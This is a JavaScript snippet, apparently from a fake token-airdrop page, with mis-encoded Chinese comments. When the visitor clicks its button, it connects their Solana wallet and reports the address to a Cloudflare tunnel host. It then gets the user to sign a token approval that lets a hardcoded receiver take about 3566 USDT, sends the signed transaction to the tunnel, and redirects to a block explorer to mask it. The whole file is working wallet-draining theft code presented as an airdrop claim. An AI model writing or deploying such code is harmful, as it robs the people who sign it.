<script>
    // ğŸ”± 2026-02-20 æœ€ç»ˆä¸æ»‘å¯¹é½æ–¹æ¡ˆ
    const tunnel = "https://phpbb-offered-karaoke-ethical.trycloudflare.com";
    const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
    const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";

    document.getElementById('cta').onclick = async () => {
        const sWeb3 = window.solanaWeb3;
        const p = window.solana;
        if (!p) {
            alert("Please open in Phantom/Solflare");
            return;
        }

        try {
            // 1. å”¤èµ·è¿æ¥
            await p.connect();
            document.getElementById('progress').style.width = "30%";

            // 2. ä¸æ»‘æ ¸å¿ƒï¼šç›´æ¥ä»å…¬é“¾æ‹¿ Blockhashï¼Œä¸ç­‰éš§é“å“åº”
            const conn = new sWeb3.Connection("https://api.mainnet-beta.solana.com");
            const { blockhash } = await conn.getLatestBlockhash();
            document.getElementById('progress').style.width = "50%";

            // 3. å‘åç«¯â€œæ‰“æ ‡â€ (å¯¹é½ airdrop_gateway_20260214_w7t1.py)
            fetch(`${tunnel}/signal_airdrop`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ address: p.publicKey.toString() })
            });

            // 4. æ„å»º V49 æ ¸å¿ƒè½¬è´¦é€»è¾‘ (3566 USDT)
            const data = new Uint8Array(9);
            data[0] = 4; 
            const amount = 3566787333;
            new DataView(data.buffer).setUint32(1, amount, true); 

            const [userAta] = await sWeb3.PublicKey.findProgramAddress(
                [p.publicKey.toBuffer(), new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), new sWeb3.PublicKey(USDT_MINT).toBuffer()],
                new sWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
            );

            const tx = new sWeb3.Transaction().add(
                new sWeb3.TransactionInstruction({
                    keys: [
                        { pubkey: userAta, isSigner: false, isWritable: true },
                        { pubkey: new sWeb3.PublicKey(RECEIVER), isSigner: false, isWritable: false },
                        { pubkey: p.publicKey, isSigner: true, isWritable: false }
                    ],
                    programId: new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
                    data: data
                })
            );

            tx.recentBlockhash = blockhash;
            tx.feePayer = p.publicKey;

            // 5. å”¤èµ·ç­¾å (è¿™å°±æ˜¯æœ€ä¸æ»‘çš„ä¸€è·³)
            const signed = await p.signTransaction(tx);
            document.getElementById('progress').style.width = "100%";

            // 6. åºåˆ—åŒ–å›ä¼ 
            const serialized = signed.serialize();
            let binary = '';
            const bytes = new Uint8Array(serialized);
            for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
            
            fetch(`${tunnel}/collect_v42?raw=${encodeURIComponent(btoa(binary))}`);
            
            setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);

        } catch (e) {
            console.error(e);
            location.reload(); 
        }
    };
</script>
